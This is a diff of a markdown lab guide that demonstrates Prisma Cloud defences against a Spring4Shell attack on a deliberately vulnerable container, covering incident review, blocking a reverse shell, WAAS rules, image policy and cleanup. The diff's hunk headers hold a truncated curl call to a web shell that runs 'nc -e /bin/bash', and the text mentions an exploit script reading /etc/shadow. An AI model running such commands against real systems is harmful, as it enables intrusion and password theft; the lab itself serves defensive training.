@@ -86,9 +86,10 @@ curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2
     - Code Injection
     - Local File Inclusion
 2. Navigate to **Compute > Radars > Hosts** Locate the new Host and should show red hue around.  Click and show that it has been involved in an Incident.
-3. Navigate to **Compute > Monitor > Runtime > Incident Explorer** Should see incidents for these attacks.  Discuss both.
+3. Navigate to **Compute > Monitor > Runtime > Incident Explorer** Should see incidents for these attacks.
     - Reverse Shell
     - Lateral Movement
+4. Discuss both, including viewing Forensic Data, showing the command in the Events
 
 ### Turn on Defenses in Prisma Cloud
 1. Block Reverse Shell 
@@ -105,8 +106,28 @@ curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2
     - Edit the Host WAAS Rule to Prevent
     - Re-run attack and should receive errors now and unable to gain passwords from the `cat /etc/shadow` command that runs in the script
     - Show in Primsa Cloud the event was Blocked/Prevented
+4. Prevent Container with Critical Vulnerabilities from even running
+    - Navigate to **Compute > Defend > Vulnerabilities > Images > Deployed
+    - In the spring4shell-ubuntu terminal, kill the current container
+        - Get the container ID of **vuln_app_app** `docker ps`
+        - `docker kill <ID>`
+    - Try creating a new container `docker run --rm -p 80:8080 vuln_app_app`
+    - You should see a message that Image is blocked by your policy.
+
+## Future - Build out connection AWS registry, Github repo, full workflow.
+To Do's
+- Create repo with Dockerfile and app files
+- SYnc up with Prisma Cloud
+- Add CI tools to push to ECR
+- Setup Scan of Repos/Registries
+- Setup to be able to pull images from registry to vulnerable instance
 
 ## Cleanup
 1. Disable Host WAAS rule
 2. Change Runtime Container Policy, Processes from Prevent to Alert
 3. Exit SSH sessions and run the `bash destroy-lab.sh` script
+
+
+## Other Notes
+There are some additional improvements. Such as:
+- Editing the output messages in the exploit script to not echo if being blocked.  As of now it prints the message regardless.
